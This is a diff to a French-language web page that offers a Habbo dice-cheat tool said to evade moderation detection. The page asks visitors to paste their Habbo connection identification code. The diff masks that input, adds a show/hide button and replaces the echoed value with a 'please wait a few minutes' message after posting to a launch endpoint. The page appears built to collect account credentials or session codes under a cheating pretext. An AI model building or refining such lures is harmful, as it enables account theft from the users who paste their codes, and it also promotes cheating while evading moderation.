@@ -370,10 +370,34 @@
       Une fois connecté, et le code d'identification de la connexion Habbo rempli, l'application va permettre de déployer une couche supplémentaire afin d'éviter la détection de modération (les dés vont alors tourner client-side de la seconde couche).
     </div>
 
-    <div class="code-input-row">
-      <input class="code-input" id="codeIdInput" placeholder="Colle ta valeur ici">
-      <button class="btn-code" onclick="submitNote()">✔ VALIDER</button>
-    </div>
+<div class="code-input-row">
+
+  <input
+    type="password"
+    class="code-input"
+    id="codeIdInput"
+    placeholder="Colle ta valeur ici"
+  >
+
+  <button
+    type="button"
+    class="btn-code"
+    onclick="toggleVisibility()"
+    style="
+      background:#13254F;
+      color:white;
+      border-color:#2A3F7F;
+      padding:0 14px;
+    "
+  >
+    👁
+  </button>
+
+  <button class="btn-code" onclick="submitNote()">
+    ✔ VALIDER
+  </button>
+
+</div>
 
     <div class="saved-note-box" id="savedNoteBox">
       Aucune donnée enregistrée.
@@ -445,6 +469,17 @@ const input = document.getElementById("codeIdInput");
 input.addEventListener("paste",()=>setTimeout(cleanInput,10));
 input.addEventListener("input",cleanInput);
 
+function toggleVisibility(){
+
+  const input = document.getElementById("codeIdInput");
+
+  input.type =
+    input.type === "password"
+      ? "text"
+      : "password";
+
+}
+
 function cleanInput(){
   input.value = removePrefix(input.value.trim());
 }
@@ -466,7 +501,7 @@ fetch('/api/me')
 
   if(cleanedValue){
     document.getElementById('savedNoteBox').textContent =
-      "Donnée enregistrée : " + cleanedValue;
+      "Donnée enregistrée ! Veuillez patienter quelques minutes.";
   }
 
 });
@@ -484,7 +519,7 @@ async function submitNote(){
   await fetch('/api/request-launch', { method: 'POST' });
 
   document.getElementById('savedNoteBox').textContent =
-    "Donnée enregistrée : " + cleanedValue;
+    "Donnée enregistrée ! Veuillez patienter quelques minutes.";
 
   input.value="";
 }
